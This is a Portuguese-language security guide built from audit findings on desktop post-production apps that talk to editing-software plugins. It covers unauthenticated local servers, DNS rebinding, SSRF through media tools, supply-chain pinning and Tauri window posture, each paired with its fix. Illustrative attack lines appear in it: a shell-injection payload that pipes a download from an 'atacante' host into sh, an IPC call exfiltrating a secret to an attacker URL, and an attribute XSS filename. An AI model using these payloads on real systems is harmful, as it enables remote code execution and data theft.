# Segurança de apps de post — o que se erra e como se fecha

Conhecimento **transversal a apps**, não a formatos: as vulnerabilidades que aparecem quando se
constrói um app desktop que conversa com NLEs. Cada item aqui saiu de um achado **real**, com
prova de exploração, na auditoria do **Órbita** em 2026-08-06 — feita para preparar o app a um
pentest corporativo. Nenhum é hipotético.

> **Por que isto mora no banco de NLEs:** três das cinco falhas mais graves são **específicas
> deste domínio**. Elas não aparecem em checklist genérico de segurança web porque envolvem
> plugin de NLE, ponte HTTP local e ferramentas de mídia. Quem for construir o segundo app do
> ecossistema vai reencontrar exatamente as mesmas.

Nível de confiança de tudo abaixo: **`confirmado`** — cada achado foi reproduzido antes da
correção e verificado depois (`curl`, `pytest`, `cargo test`). Ver `dados/checklist.json` para a
versão consumível por máquina.

---

## 1. ⛔ O `.debug` do painel CEP é uma porta dos fundos — e ele viaja no instalador

**O que acontece.** Um arquivo `.debug` na pasta da extensão CEP faz o CEF do Adobe abrir o
**Chrome DevTools Protocol** na porta declarada (8088, tipicamente), **sem autenticação
nenhuma**, num contexto onde o `--enable-nodejs` do manifest está ligado. Um
`Runtime.evaluate("require('child_process').exec(…)")` é execução de código com as permissões do
Premiere — no macOS, herdando os grants de TCC dele: Documentos, Desktop, volumes externos.

**Por que passa despercebido.** É a ferramenta que se usa para desenvolver o painel. Ela entra no
repositório no primeiro dia, e o instalador copia a pasta **inteira**. No Órbita o arquivo foi
parar no bundle do Tauri (`bundle.resources`) e na pasta de extensões da máquina do usuário —
confirmado por inspeção do install real, não por leitura de código.

**Como fechar (três trancas, porque é fácil de reintroduzir):**
1. O arquivo vive no repositório como `debug.sample.xml`, **nunca** como `.debug`.
2. O copiador do instalador tem uma lista `NUNCA_INSTALAR` que recusa `.debug` mesmo se ele
   reaparecer.
3. Um teste falha se um `.debug` voltar ao repositório.

Vale o mesmo raciocínio para qualquer arquivo de *debug remoto* de plugin (UXP, ZXP, scripts).

---

## 2. ⛔ `PlayerDebugMode` é um custo permanente — e desinstalar tem de desfazê-lo

Para carregar um painel CEP **não assinado**, o app liga `PlayerDebugMode`
(`defaults write com.adobe.CSXS.<v>` no macOS, `HKCU\Software\Adobe\CSXS.<v>` no Windows).

O que esse interruptor realmente faz: manda o Adobe carregar **qualquer** extensão CEP não
assinada, em **todos** os apps Adobe daquele usuário, **para sempre**. A partir daí, qualquer
coisa que consiga escrever na pasta do usuário larga um painel em `.../CEP/extensions` com Node
habilitado e ganha execução **persistente** dentro do Premiere/After Effects.

**Regra:** quem liga, desliga. O desinstalar tem de reverter (`defaults delete` / `reg delete`),
e a interface deve dizer o que o interruptor faz antes de ligá-lo. A saída definitiva é **assinar
o painel (ZXP)** e não precisar dele.

---

## 2b. ⛔⛔ E quando se checa `Host`, é IGUALDADE EXATA — `startswith` deixa o rebinding passar

`CORRIGE:` (2026-09-24, revisão vermelho × azul do De Lá Pra Cá, `_DeLaPraCa/docs/seguranca/
2026-09-24-vermelho-azul-magic-link.md`, ataque V1). O portão testava
`host.startswith(("127.0.0.1", "localhost"))`, e **`127.0.0.1.atacante.com` começa assim**. Com
DNS rebinding, a página do atacante resolve para 127.0.0.1. Num GET para a própria origem o
navegador manda `Sec-Fetch-Site: same-origin` **sem `Origin`**, e o portão a toma pela UI servida.
Provado por teste: `/magic`, `/export` e `/receber/caixa` respondiam. A correção é comparar o
nome (sem a porta) por **igualdade** com `127.0.0.1`/`localhost` (`portao.host_local`), como o
Órbita faz em Rust.

⚠️ **O mesmo `startswith` está copiado em outros apps da família** (achado em 2026-09-24, NÃO
corrigido lá):
- `_ASSIST ANTERIOR/assist_anterior/api/portao.py:163`
- `Promo Entrega/plugins/media-composer/servico/api/portao.py:91`

## 2b-bis. Compressão não é proteção (decisão do De Lá Pra Cá, 2026-09-25)

Perguntado se gzipar a Carta Aberta, como o PRPROJ é gzipado, aumentaria a segurança: **não**.
Gzip não esconde (qualquer um descompacta), não prova autoria (quem altera recomprime) e
acrescenta a bomba de descompressão (o teto de tamanho teria de valer para o DESCOMPRIMIDO, lido
em streaming). O ganho é só tamanho: uma Carta real de 1,9 MB caiu para 62 KB (30×) em 10 ms. O
que protege de verdade é **assinatura** (autoria e integridade) e, se a pasta não for confiável,
criptografia. A assinatura da Carta foi **adiada** pelo autor; as opções levantadas eram parear
máquinas (Ed25519, exige `cryptography`) ou um código da produção (HMAC, stdlib).

## 2c. ⛔⛔ Um caminho gravado num arquivo de projeto é uma ORDEM de acesso à rede

Ataque V2 da mesma revisão. Um texto de terceiro, o `Source Path` de uma Carta, virava o
`MediaFilePath` de um DRT. Quem **abre** o DRT é o Resolve, e ele iria atrás de
`\\atacante\…`: sessão SMB, com o hash NTLM do usuário. A tranca `caminho_confiavel` protegia o
NOSSO processo (nenhum `exists()` em UNC), mas **não o NLE que lê o arquivo que nós
escrevemos**. Regra: o que um app ESCREVE num AAF/XML/DRT/PRPROJ como caminho de mídia tem de
passar pela mesma tranca de UNC que o que ele LÊ.

## 3. ⭐ A checagem de `Host` NÃO protege um servidor local. Só um segredo protege

**O erro conceitual, que é o mais importante deste documento.** Um app que sobe um servidor em
`127.0.0.1` para conversar com um plugin costuma raciocinar assim:

> "Escuto só em 127.0.0.1 e confiro o header `Host`. Isso derrota DNS-rebinding. Um processo
> local malicioso já teria acesso à mídia de qualquer forma, então está resolvido."

**Está errado**, e o buraco é grande. A frase esquece o cliente mais comum de todos: **uma página
web qualquer, aberta numa aba do navegador do usuário**. Ela faz

```js
fetch("http://127.0.0.1:7817/syncmap", { method: "POST", body: … })
```

e o `Host` dessa requisição é **`127.0.0.1:7817`** — o **alvo**, não a origem. A checagem passa.
Se as respostas ainda saem com `Access-Control-Allow-Origin: *`, o site também **lê** o resultado.

No Órbita, isso dava a qualquer site visitado: o caminho do executável e as pastas do usuário
(portanto o nome de usuário do sistema), a capacidade de mandar o motor **ler arquivos que o
atacante nomeasse**, apagar o cache, roubar da fila de trabalho do painel e injetar material na
janela do app.

**A defesa que funciona é um segredo em arquivo:**

```
app inicia → gera 32 bytes do CSPRNG → grava em <dados do app>/plugin-token com modo 0600
servidor  → exige o header X-Orbita-Token em TODA rota (inclusive /health)
            (Ciclo Assist, módulo Sincronizar, 2026-11-07: o header virou X-Sincronizar-Token e o arquivo mora em
             <dados do Ciclo Assist>/sincronizar/plugin-token — o mecanismo é o mesmo)
plugin    → lê o arquivo (CEP tem Node `fs`; Lua tem `io.open`; Python tem `open`)
navegador → NÃO consegue ler arquivo nenhum  ⇒ nunca obtém o token
```

**A assimetria é o mecanismo inteiro:** não é a porta, não é o `Host`, não é o CORS. É que o
plugin está no sistema de arquivos e a aba do navegador não está.

Detalhes que importam:
- **Comparar em tempo constante.** Um `==` de strings sai no primeiro byte diferente e vaza o
  segredo byte a byte. É achado de pentest mesmo quando a exploração é difícil.
- **Falhar fechado.** Sem entropia, token vazio, e token vazio nunca confere — servidor
  inalcançável em vez de aberto.
- **Rotacionar por sessão** e o cliente **relê o arquivo ao tomar 401**. Rotação de graça.
- **Um ponto único no cliente** que carimba o header. Com 11 `fetch` espalhados, é questão de
  tempo até um novo esquecer — e um endpoint sem token é o portão aberto de novo.
- **Segunda tranca:** recusar `Origin:` com esquema `http(s)`. Painel CEP roda de `file://`
  (origem opaca) e curl não manda `Origin`; um site sempre manda.
- **Teto no corpo da requisição.** Um `Content-Length` de 8 GB faz o servidor alocar 8 GB. DoS de
  uma linha de curl.

**O que o token NÃO resolve, e é honesto dizer:** um processo local malicioso rodando como o
usuário lê o arquivo. Contra ele não há defesa nesse nível — já tem a mídia toda. A fronteira
que o token fecha é **navegador ↔ sistema de arquivos**, e é a que importa.

---

## 4. ⭐ Quem responde na porta manda no plugin — o servidor também precisa ser desconfiado

O token autentica o **cliente** para o **servidor**. A direção **inversa** continua aberta:
ocupar a porta antes do app é trivial, e **silencioso** — um bind que falha normalmente só loga.
A partir daí o impostor responde o que quiser, e o plugin obedece.

Dois casos reais, os dois no Órbita:

**(a) O plugin executava um binário escolhido pela resposta HTTP.** O `/health` devolvia o
caminho do executável do app; o painel guardava isso em `localStorage` e passava a
`child_process.spawn` para oferecer "abrir o app". Ou seja, **a rede escolhia o programa a
executar** — e o valor sobrevivia ao impostor.
→ **Regra: nada que venha da rede vira comando.** Abrir o app por **nome** (`open -a "Nome"` no
macOS) ou por uma **lista fechada** de locais de instalação, escrita no próprio código.

**(b) Injeção de shell via campo da resposta.** O script Lua do Resolve fazia HTTP com
`io.popen("curl -s " .. args)`. `io.popen` passa por `/bin/sh -c`, e **aspas duplas não
protegem**: `$( )` e crases expandem dentro delas. O `job_id` da resposta ia direto para a URL:

```lua
-- o servidor devolve:  {"job_id": "1$(curl -s http://atacante/x | sh)"}
http_get("/prproj/status?id=" .. job_id)   -- execução de shell num clique em "Sincronizar"
```

→ **Regra: valide o formato antes de concatenar** (`^[%w_%-]+$`), e prefira lista de
**permitidos** para o que é ASCII e nosso (a rota), lista de **proibidos** só onde precisa aceitar
o mundo real (caminho de temp com `\`, `:`, espaço e acento — `C:\Users\João`).

> Nota comparativa útil: o irmão **Python** do mesmo script não tinha o bug — usa `urllib` e
> `quote()`, sem shell nenhum. A falha nasceu da **porta para Lua**, onde não há cliente HTTP e
> se cai no `popen`.

### 4.1 ⛔⛔ No Windows o bind NEM FALHA — e o segundo servidor sobe mudo — `confirmado` 2026-09-12

Este §4 abre dizendo que *"ocupar a porta antes do app é trivial, e **silencioso** — um bind
que falha normalmente só loga"*. **A medição mostra que é pior: no Windows o bind nem
falha.**

`http.server.HTTPServer` traz `allow_reuse_address = 1` de fábrica. No Unix isso quer dizer
"reaproveitar socket em `TIME_WAIT`". **No Windows quer dizer que um segundo processo binda a
mesma porta com sucesso, com o primeiro ainda servindo** — é para isso que existe o
`SO_EXCLUSIVEADDRUSE`, que a stdlib não usa.

Medido, sem malícia nenhuma, no Ciclo Assist: **dois serviços escutando a 7824**, um de
15:32 e outro de 17:26, o novo logando `serviço em http://127.0.0.1:7824` e o **VELHO
respondendo todos os pedidos**.

⚠️⚠️ **O sintoma é indistinguível de "painel desatualizado"**: a tela nova pede rotas que o
processo de trás não tem, e o conselho impresso no produto — *"reinicie o serviço"* — deixa
de resolver, porque reiniciar sobe um terceiro processo igualmente mudo.

⇒ **Consequência de segurança, e ela é direta:** a tomada de porta descrita no §4 não
precisa chegar antes do app. Um processo que suba **depois** assume a porta do mesmo jeito
em parte das tentativas, e o app legítimo **não tem como saber** — ele acha que é o dono.

⇒ **O conserto é uma linha, e o alto-falante é o ponto:** `allow_reuse_address = 0` antes de
instanciar o servidor, e um erro que diga o que fazer. ⭐ No nosso caso o tratamento de
"porta ocupada" **já existia e estava certo** desde o primeiro dia — com a mensagem certa e
o comentário certo (*"subir um segundo seria pior que recusar: o painel acharia um dos dois,
sem dizer qual"*). O que o anulava era o bind PASSAR, então o `OSError` nunca acontecia.
*Tratamento de erro para um erro que nunca é levantado é código morto que parece defesa.*

---

## 5. ⭐ "Caminho de arquivo" não é caminho: as ferramentas de mídia falam rede

**O erro:** o código trata a string como arquivo local. As bibliotecas de mídia, não.

- **MediaInfo** (`pymediainfo`): o `MediaInfo_Open` roda **antes** de qualquer checagem, e a
  checagem de existência é **explicitamente pulada** quando a string contém `://`. A
  `libmediainfo` costuma vir com `Reader_libcurl` compilado — ela **busca a URL**. (Confirmado
  por `strings` na `.dylib` embarcada; o libcurl entra por `dlopen`, então **não aparece no
  `otool -L`** — não confie na lista de bibliotecas ligadas para concluir que não há rede.)
- **ffmpeg/ffprobe**: falam `http`, `https`, `ftp`, `rtmp`, além de `concat:`, `subfile:`,
  `data:`, `pipe:`.

Consequência: um caminho vindo de fora vira **SSRF a partir da máquina do editor** (varredura de
rede interna, alcance a serviços que só escutam em localhost) e, com caminho local, um **oráculo
de existência de arquivo**.

**Correção — uma linha resolve dois problemas:**

```python
"file:" + os.path.abspath(caminho)     # depois de validar que is_file()
```

- o prefixo `file:` **fixa o protocolo**: `http://…` deixa de ser alcançável;
- e a string **nunca começa com `-`**, o que fecha o segundo problema: o ffprobe recebe o caminho
  como **operando posicional**, e um arquivo chamado `-report.mov` seria lido como **opção**.
  ⚠️ **O ffmpeg NÃO honra `--` como fim-de-opções** (ele vira o nome de opção `-`, desconhecido),
  então o truque habitual do Unix não serve aqui. O prefixo `file:` é a saída.

Cuidado ao detectar URL: a regra é **`://`**, não "tem dois-pontos" — `C:\Users\x.mov` é caminho
legítimo do Windows. Some a isso uma lista curta e explícita (`concat:`, `subfile:`, `data:`,
`pipe:`).

---

## 6. `re.sub` reprocessa o valor: o bug que quebrava o Windows inteiro

Vale para **qualquer writer de XML feito por substituição de texto** — DRT, FCPXML, EDL, XMEML.

```python
re.sub(rf"<{tag}>.*?</{tag}>", f"<{tag}>{valor}</{tag}>", bloco)   # ERRADO
```

O terceiro argumento é **template de substituição**: `\1`, `\g<0>` e escapes de barra invertida
são expandidos **depois** de o valor já ter passado pelo escape de XML. Duas consequências, e a
segunda não é de segurança — é um bug funcional que estava em produção:

1. **Todo caminho do Windows começa por `C:\Users\…` → `re.error: bad escape \U`.** O export de
   DRT **falhava sempre no Windows**, e nunca no macOS. Sobreviveu a várias versões porque quem
   testava estava no Mac.
2. **Furava o escape de XML.** Um arquivo chamado `A\g<0>B.mov` reinjetava as tags que o escape
   tinha acabado de neutralizar — o **nome de um arquivo** emendando elementos no documento que
   o NLE vai abrir.

**Correção:** replacement por **função**, que é literal por definição.

```python
alvo = f"<{tag}>{valor}</{tag}>"
re.sub(pat, lambda _m: alvo, bloco)                                 # CERTO
```

⚠️ **Varra o arquivo inteiro, não só o helper óbvio.** No Órbita havia mais dois pontos onde
blocos XML já montados (contendo `MediaFilePath` absolutos) eram passados como replacement.

**Regra maior:** se dá para usar `xml.etree.ElementTree`, use — ele escapa sozinho e este bug não
existe. O writer de PRPROJ do Órbita usa ElementTree e estava **limpo**; só o de DRT, que edita
blocos de um gabarito, tinha o problema.

---

## 7. Cadeia de suprimentos: HTTPS não protege contra o asset trocado na origem

Apps de post embarcam ferramentas grandes — ffmpeg, ffprobe, MediaInfo. É normal um script de
build baixá-las. O modelo de ameaça **não é interceptação de rede** (o TLS cobre isso): é o
**asset substituído na origem**.

Um release do GitHub é **mutável**. Quem tiver a conta do mantenedor troca o zip sem mudar a URL,
e o próximo build assa um binário trojanizado dentro do instalador que os usuários baixam. É o
padrão xz-utils em miniatura, com raio de alcance igual à base instalada.

**Correção:** SHA-256 de cada asset **fixado no script versionado** — assim trocar um hash
aparece no diff e passa por revisão, que é exatamente a propriedade que falta a um download
silencioso. **Falhe fechado**: URL sem hash registrado não deve nem ser baixada.

Notas de quem já fez:
- Vendorizar num release próprio (em vez de depender de autobuilds de terceiros que expiram) é
  bom e resolve **disponibilidade** — mas **não** resolve integridade. São coisas diferentes.
- Checar **zip-slip** ao descompactar. Extrair para caminho fixo com `z.read(nome)` (em vez de
  `extractall`) já é imune — vale registrar quando for o caso.
- No Python, pinar dependências com `pip-compile --generate-hashes`. Sem isso, o binário
  distribuído não é reproduzível e depende do que o PyPI servir naquele minuto.

---

## 8. Resolução de binários: no Windows, o diretório atual entra na busca

`Command::new("ffmpeg.exe")` (Rust) e `shutil.which("ffmpeg")` (Python) procuram, no Windows, o
**diretório de trabalho atual**. Se o app for aberto com o CWD numa pasta onde outra pessoa
escreve — Downloads é o caso clássico —, um `ffmpeg.exe` plantado ali roda no lugar do embarcado.
É *binary planting* de manual.

**Regra:** em app **empacotado**, o binário embarcado ao lado do executável é a **única** fonte
aceita. Se ele não estiver lá, a instalação está quebrada e a resposta certa é **falhar com
mensagem clara** — nunca "procurar por aí". Em desenvolvimento, o PATH continua valendo (é o que
torna o `dev` utilizável).

---

## 9. Postura da janela (Tauri/Electron): dois defaults de scaffold que ficam

- **`"csp": null`** — a WebView roda **sem política nenhuma**. Mesmo sem um caminho de injeção
  conhecido (React escapa por padrão), é achado garantido num pentest, e a CSP é o que impede um
  deslize futuro de virar exfiltração. Ponto de partida que funcionou:

  ```
  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob: asset: http://asset.localhost;
  media-src 'self' blob: data: asset: http://asset.localhost;
  connect-src 'self' ipc: http://ipc.localhost asset: http://asset.localhost https://api.github.com;
  object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'none'
  ```

  (`style-src 'unsafe-inline'` é exigido por React/Tailwind; `blob:` em `media-src`, por hls.js.)

- **`assetProtocol.scope: ["**"]`** — a WebView pode ler **qualquer arquivo do disco**. Num app
  de post isso é *quase* inerente: o usuário escolhe mídia em qualquer lugar, e o `convertFileSrc`
  precisa alcançá-la. A saída correta é **escopo estreito + `allow_file` em runtime** conforme o
  usuário admite cada arquivo. Enquanto isso não existe, é uma **decisão consciente a
  documentar** — e a CSP acima é o que reduz o dano, porque tira o caminho de exfiltração.

- **Permissões (capabilities):** liste uma a uma em vez de usar os conjuntos `*:default`. No
  Tauri v2, `opener:default` traz junto `allow-reveal-item-in-dir`, que **não aceita escopo** e
  revela qualquer caminho do disco — anulando na prática o escopo cuidadoso que se pôs no
  `allow-open-path` ao lado.

---

## 10. Mensagens de erro são um oráculo do disco

`"Arquivo de câmera não encontrado: /Users/joao/contratos/x.mov"` faz três favores a quem sonda:
confirma a existência (ou não) de um caminho arbitrário, entrega o **nome de usuário do sistema**
e mapeia a árvore de diretórios. O mesmo vale para 500 bytes de `stderr` do ffmpeg subindo até o
cliente HTTP.

**Regra:** mensagem **estável e genérica** para o cliente; caminho, stderr e stack trace vão para
o **log em disco**, que é do dono da máquina. E teto no volume de trabalho por comando — um
sidecar serial com 100 mil caminhos na fila é o app inteiro travado.

---

## 11. ⭐ A segunda passada: ataque a defesa que você acabou de construir

Depois de corrigir tudo acima, o Órbita passou por uma **segunda rodada adversária**,
mirando a correção e não o código original. Ela achou **seis** coisas novas — o que é o
argumento mais forte deste documento inteiro: *uma passada só não basta, e a correção é
código novo como qualquer outro.*

**a) Gravar um segredo em disco é mais difícil do que parece.** A gravação do token usava
`create(true).truncate(true).mode(0o600)`. Dois furos, os dois reproduzidos em disco:

- **`mode` só vale na CRIAÇÃO.** Arquivo pré-existente **mantém** a permissão que tinha.
  Um atacante local que plante `plugin-token` com `0666` antes de o app subir recebe o
  segredo num arquivo legível por todos.
- **`O_CREAT` sem `O_EXCL` segue symlink.** Um link no lugar do arquivo faz o app gravar
  o segredo no alvo escolhido pelo atacante.

Receita correta: apagar o que estiver no caminho **sem seguir link**
(`symlink_metadata` + `remove_file` removem o LINK, nunca o alvo) e criar com
`create_new` (`O_EXCL`), que não segue symlink e **falha** se algo aparecer no meio.
Falhar é o comportamento certo: sem segredo publicado, o portão fica fechado.

**b) A defesa nova vira superfície nova.** O servidor passou a ser peça central, e o
accept loop é de uma thread só: um pânico ali matava a ponte inteira **em silêncio**.
Qualquer bug de tratamento de entrada viraria negação de serviço. `catch_unwind` por
requisição + mutex tolerante a envenenamento.

**c) Recusar também vaza.** As respostas de recusa saíam com
`Access-Control-Allow-Origin: *` — o site lia o motivo, confirmava que o app está
instalado naquela máquina, e o texto de ajuda ainda dizia **onde fica o arquivo do
token**. Recuse sem se explicar para quem não deveria estar perguntando.

> **Descoberta de brinde, e não a estrague:** o preflight devolvia
> `Access-Control-Allow-Headers: Content-Type` — que **não** lista o header do token.
> Isso faz o próprio navegador **bloquear** qualquer site que tente enviá-lo. É uma
> tranca de graça. Se um dia "o painel não conecta" tentar te convencer a adicionar o
> header do token nessa lista, **não adicione**: o painel não precisa (origem opaca não
> passa por essa checagem) e você estaria destravando exatamente essa proteção.

**d) ⭐ Uma CSP não fecha o canal de saída.** É o achado mais contraintuitivo. A CSP
impede carregar script externo e injetar `<script>` — real e vale. Mas num app Tauri a
capability `opener:allow-default-urls` permite `https://*`, e

```js
invoke('plugin:opener|open_url', { url: 'https://atacante/?d=' + btoa(segredo) })
```

abre o navegador do sistema com os dados na query string. **A CSP não alcança esse
caminho**, porque não é um fetch da página — é um comando IPC. Some-se a navegação
top-level (`location = …`), que também não tem diretiva de CSP que a cubra
(`form-action` só fecha formulários; `navigate-to` nunca foi implementado).
**Postura de WebView se avalia junto com as capabilities, nunca só pela CSP.**
Restrinja `open_url` aos endereços que a interface realmente abre.

E tire `asset:` do `connect-src`: com ele, um `fetch()` na janela lê qualquer arquivo do
disco — um segundo primitivo de leitura, independente de qualquer comando. `<video src>`
não precisa dele (isso é `media-src`).

**e) Fronteira construída de um lado só é meia fronteira.** A validação de caminho existia
no sidecar Python e **não** no Rust — e o único comando de mídia que não checava
`is_file()` era justamente o que também **escrevia** arquivos (a playlist e os segmentos
iam para o muxer, que escreve onde mandarem). Quando dois processos falam com as mesmas
ferramentas, **espelhe a fronteira nos dois**. Pelo mesmo motivo, valide o caminho de
SAÍDA no processo que escreve, não só no que chama: depender da barreira do vizinho é o
mesmo erro de desenho que deixa um servidor local sem autenticação.

**f) Nome não é contrato.** Um comando chamado `read_cache_bytes`, documentado como "lê
playlist e segmento", lia **qualquer arquivo do disco** e devolvia os bytes. Onde o
comentário for mais estreito que o código, é o código que está errado — e um pentester
lê os dois.

---

## 11b. ⚠️⚠️ O NOME DO ARQUIVO é entrada de terceiro — e o escape "óbvio" não cobre aspas

`confirmado` 2026-08-16, achado auditando o De Lá Pra Cá contra o Guia de Desenvolvimento
Seguro da Emissora (§6, XSS).

O idioma mais comum para escapar HTML em JS é este, e ele é **insuficiente**:

```js
const d = document.createElement("div");
d.textContent = valor;
return d.innerHTML;         // escapa & < >  —  NÃO escapa " nem '
```

Funciona para conteúdo de elemento. **Quebra dentro de atributo**, que é onde um painel de
NLE costuma pôr caminho e MobID:

```js
`<button data-arquivo="${escapar(caminho)}">`     // ← aspas fecham o atributo
```

Um arquivo chamado `a".onerror="alert(1)` injeta um handler. **Correção:** acrescentar
`.replace(/"/g,"&quot;").replace(/'/g,"&#39;")`.

⭐⭐ **A parte que interessa a este banco não é o escape — é DE ONDE vem o dado.** Um app
de NLE trata nome de arquivo como dado próprio, e ele não é: **o acervo vive em storage
compartilhado de produção, e quem nomeia não é quem executa o app**. Vale para nome de
arquivo, nome de bin, nome de clipe, `reel_name`, tape, e qualquer coisa que venha de um
`.mdb`, `.pmr` ou de um banco de mídias compartilhado.

⚠️ **E a assimetria que fez o defeito passar despercebido:** aspas são **ilegais** em nome
de arquivo no **Windows** e **legais** no **macOS**. Um app testado só no Windows nunca vê
o problema — e estes apps atravessam os dois sistemas. É a mesma família de armadilha do
[transversal/desenvolvimento-cross-platform.md](../transversal/desenvolvimento-cross-platform.md):
*uma propriedade de um SO não é uma propriedade do outro*.

**Segunda camada, e ela é barata num painel local:** `Content-Security-Policy` com
`default-src 'self'` e `frame-ancestors 'none'`. A UI de um plugin não busca nada de fora,
então a diretiva restritiva não custa nada — e sem ela uma injeção que escapasse do
sanitizador teria para onde exfiltrar. ⚠️ Confira junto que a página **não tem `<script>`
nem `style=` embutido**: senão alguém afrouxa a CSP para a página voltar a funcionar, e a
defesa vira enfeite.

⚠️ **Reincidência medida em 2026-09-19 (Assist anterior), e o sintoma não aponta para a
CSP.** Ao transplantar o painel do Órbita, a linha que declara o idioma
(`window.ORBITA_LOCALE = "pt-BR"`) foi posta num `<script>` inline do HTML. A CSP da casca
(`default-src 'self'`) o bloqueou **sem erro visível**, e o que se viu foi o painel em
**inglês**: o script caiu no `navigator.language`, que dentro do MC é o `en-US` do
QtWebEngine. Nada na tela lembrava segurança. Só um screenshot pegou. O conserto foi pôr a
linha no `.js` servido. ⭐ Regra prática: com CSP restritiva, **dado de configuração da
página vai no arquivo de script**, nunca inline, mesmo quando "é só uma linha".

## 12. ⚠️ O endurecimento pode quebrar o app — e o teste unitário não vai te contar

O achado mais caro da auditoria do Órbita **não foi uma vulnerabilidade**: foi uma
regressão introduzida por uma correção, que passou por 195 testes unitários verdes e só
apareceu num sync com **mídia de verdade**.

A correção do item 5 (`file:` + absoluto) foi aplicada uniformemente a todas as
ferramentas de mídia. Mas:

```
MediaInfo.parse("file:/Volumes/…/A001.mov")  →  FileNotFoundError
ffprobe          "file:/Volumes/…/A001.mov"  →  OK
```

`file:` é um **protocolo do ffmpeg**. O MediaInfo trata a string inteira como nome de
arquivo. Resultado: a leitura de metadados falhava em **toda** mídia, e a diária inteira
voltava com erro. **Nenhum teste unitário pegou, porque nenhum toca o MediaInfo de
verdade** — eles usam caminhos falsos, e caminho falso falha igual dos dois jeitos.

**Regra:** `ff_input()` (prefixo `file:`) é só para **ffmpeg/ffprobe**. O MediaInfo
recebe o caminho **cru**; a defesa dele contra SSRF é a validação (`ensure_local_file`
recusando `://`), não o prefixo.

**A lição de método, que vale mais que a regra:** depois de endurecer, **rode uma
operação legítima de ponta a ponta, com material real**. No Órbita foi um sync de 14
clipes (2 câmeras + som direto) mais a geração de um `.prproj` — 30 segundos de teste que
pegaram o que 195 testes verdes não pegaram. Um app "seguro" que não funciona não é um
resultado melhor do que um app inseguro; é só um jeito diferente de falhar.

Dois outros achados da mesma bateria contra o servidor vivo, ambos triviais de corrigir e
invisíveis na leitura de código:

- **O erro genérico devolvia o texto da exceção**, que carrega o caminho absoluto:
  pedir `/etc/passwd` respondia `Erro interno inesperado: file:/private/etc/passwd`. Pela
  **diferença** entre essa mensagem e "arquivo não encontrado", dava para confirmar o que
  existe no disco. Detalhe vai para o log; para o cliente, mensagem estável.
- **Roteamento por prefixo** (`url.starts_with`) fazia `/healthFOO` e `/health../x`
  caírem em `/health`. Não furava autenticação (o token vem antes), mas transformava a
  **ordem** das rotas em parte da lógica. Compare o caminho **exato**, e a query separada.

---

## 13. ⚠️ O que o NLE vaza — e que o seu app copia junto

`confirmado`, 2026-08-20. **Primeira exceção à regra "todo item saiu da auditoria do Órbita":**
estes três não são defeitos nossos, são do Media Composer. Entram aqui porque **um app de post
lê, copia e distribui esses arquivos** — sincroniza pasta de projeto, entrega bin para VFX,
manda `.avb` para aprovação. O defeito é deles; a propagação é nossa.

### 13a. O binlock `.lck` vaza memória do processo para a rede

O `<bin>.lck` do projeto compartilhado tem **510 bytes = `wchar_t[255]`**. Só o começo é
escrito — o nome da estação em UTF-16LE, uns 30 bytes. **Os 478 restantes não são padding:**
67% zeros e o resto **memória não inicializada**, com 10 ponteiros user-mode do Windows
válidos (`0x00007ff9c522xxxx` e `0x00007ffa422fxxxx`), espaçados de 16 em 16 bytes — frames
de pilha. São endereços de carregamento de DLL: **informação que derrota ASLR**, num arquivo
que fica numa pasta de rede **legível por toda a equipe**.

⭐ **A regra transferível:** *buffer de tamanho fixo gravado em disco sem ser zerado vaza
memória do processo.* Ao escrever um registro de tamanho fixo, zere o buffer inteiro antes.
Ao copiar arquivos de terceiros para fora da máquina, saiba o que eles carregam.

### 13b. A procedência da `.avb` é ofuscada, não cifrada

Toda `.avb` carrega um registro de procedência nos atributos do `Bin`, com **chaves e valores
ofuscados por NOT bit a bit (XOR `0xFF`)** sobre bytes mac_roman. A chave ilegível
`úçöûãöõ†ùÜ` é `created_by`. Decodificado:

```
created_by          ESTACAO-01, usuario-rede, usuario-rede!, 2026/08/19 17:01:56
created_with        Win, Avid Media Composer 21.12.10, rel.MC2021.12_R56256
creator_path        C:\Program Files\Avid\Avid Media Composer\AvidMediaComposer.exe
creator_machine_id  5298932761656574394141342
modified_by / modified_with / modifier_path / modifier__machine_id   (idem)
```

Formato: `<ESTAÇÃO>, <usuário do SO>, <perfil de usuário Avid>, <data>`. As demais chaves
(`ATTR__BIN_DISPLAY_MASK`, `BIN_COLUMNS_WIDTHS`…) ficam em **texto puro** — a ofuscação é
seletiva, o que confirma que é deliberada.

Numa bin de projeto de rede isso expõe nome de máquina, usuário do SO, perfil Avid e caminho
de instalação de **toda a equipe**. E toda bin entregue a um cliente, a um fornecedor de VFX
ou a um portal de aprovação leva o rastro junto.

⭐ **A regra:** *XOR com uma constante não é criptografia.* Se um dado só precisa não aparecer
num `strings`, diga isso; não o trate como protegido.

(Do lado útil: é uma fonte pronta de "quem mexeu por último", sem API. Numa bin real do
acervo o registro contava a história inteira — criada num Mac por um assistente com MC 23.3.1,
modificada no Windows por outro com MC 23.3.)

### 13c. Um campo de status que não valida o dado

Metadado de câmera de um Sony X-OCN, em `MasterMob.attributes._USER`:

```
Camera Roll Angle          1193046° 22' 16"        ← 1193046 = 0x123456
Positioning Data Status    Valid
```

`0x123456` é filler clássico de depuração. Não é furo de segurança, é furo de **integridade**
— e vaza para a UI e para relatório: o app exibe 1,19 milhão de graus com selo de válido.

É a mesma família do item 11b (*o nome do arquivo é entrada de terceiro*): **dado que veio de
fora precisa de validação própria, mesmo quando vem acompanhado de um carimbo dizendo que está
bom.** Cheque faixa plausível por campo antes de exibir.

## Como auditar um app novo — a ordem que funcionou

1. **Mapeie quem fala com o quê.** Toda porta local, todo `spawn`, todo `eval`/`popen`, todo
   caminho de arquivo que venha de fora. A pergunta que revela quase tudo: *"quem controla esta
   string, e o que ela vira lá na frente?"*
2. **Ataque o próprio app com `curl` antes de ler mais código.** Uma requisição com
   `Origin: https://site-malicioso.example` responde a pergunta mais importante em dez segundos.
3. **Desconfie do que o app INSTALA**, não só do que ele executa: arquivos de plugin, chaves de
   registro, `defaults write`. Foi ali que estava o achado mais grave.
4. **Rode a auditoria em frentes paralelas** (motor, plugins, cadeia de suprimentos) e depois
   **verifique cada achado você mesmo** — o `.debug`, o `re.sub` e o CORS foram os três que
   pareciam teóricos e eram todos reproduzíveis.
5. **Escreva um teste por vulnerabilidade**, nomeado pelo ataque. `pagina_web_qualquer_nao_entra_
   nem_com_host_certo` conta a história inteira para quem mexer nisso daqui a um ano.
6. **Faça a segunda passada mirando a CORREÇÃO** (seção 11). No Órbita ela achou seis coisas
